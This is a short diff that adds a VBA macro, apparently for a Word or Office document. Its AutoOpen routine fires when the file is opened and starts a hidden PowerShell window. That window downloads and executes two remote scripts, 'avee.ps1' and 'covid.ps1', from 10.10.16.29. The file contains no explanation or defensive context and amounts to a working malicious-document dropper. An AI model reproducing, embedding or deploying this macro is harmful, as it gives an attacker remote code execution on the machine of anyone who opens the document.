@@ -1,0 +1,10 @@
+Sub DoStuff()
+    Dim wsh As Object
+    Set wsh = CreateObject("WScript.Shell")
+    wsh.Run "cmd /c start powershell -Sta -Nop -Window Hidden -c iex(New-Object Net.WebClient).downloadString('http://10.10.16.29/avee.ps1');sleep 3;iex(New-Object Net.WebClient).downloadString('http://10.10.16.29/covid.ps1')"
+    Set wsh = Nothing
+End Sub
+
+Sub AutoOpen()
+    DoStuff
+End Sub
